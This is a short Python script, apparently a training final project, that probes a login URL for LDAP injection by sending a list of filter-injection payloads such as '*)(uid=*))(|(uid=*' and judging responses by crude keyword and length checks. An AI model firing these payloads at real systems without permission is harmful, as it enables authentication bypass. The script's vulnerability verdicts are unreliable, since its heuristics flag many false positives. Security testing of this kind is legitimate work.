#!/usr/bin/env python3
# LDAPProbe - LDAP Injection Tester for Lab Use Only
# Author: Muneeb Ali - PNT Trainings Final Project

import argparse
import urllib.request
import urllib.parse

PAYLOADS = [
    "*",
    "admin*",
    "*)(uid=*))(|(uid=*",
    "*)(|(uid=*",
    "*))%00",
]

def test_url(url, param, method):
    print(f"\n[+] Testing: {url} | param: {param}")
    vulnerable = False
    for payload in PAYLOADS:
        data = {param: payload}
        try:
            if method == "POST":
                encoded = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(url, data=encoded)
            else:
                full_url = url + "?" + urllib.parse.urlencode(data)
                req = urllib.request.Request(full_url)
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="ignore")
                if "Welcome" in body or "admin" in body.lower() or len(body) > 500:
                    print(f"[!] Payload '{payload}' -> POSSIBLE VULNERABLE")
                    vulnerable = True
                else:
                    print(f"[-] Payload '{payload}' -> OK")
        except Exception as e:
            print(f"[?] Payload '{payload}' -> Error: {e}")
    if vulnerable:
        print("\n[RESULT] VULNERABLE")
    else:
        print("\n[RESULT] CLEAN")
    return vulnerable

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LDAPProbe - LDAP Injection Tester")
    parser.add_argument("--url", help="Target login URL")
    parser.add_argument("--param", default="username", help="Parameter to test")
    parser.add_argument("--method", default="POST", help="GET or POST")
    args = parser.parse_args()

    if not args.url:
        url = input("Enter target URL (e.g. http://127.0.0.1:5000/login): ")
    else:
        url = args.url
    test_url(url, args.param, args.method.upper())
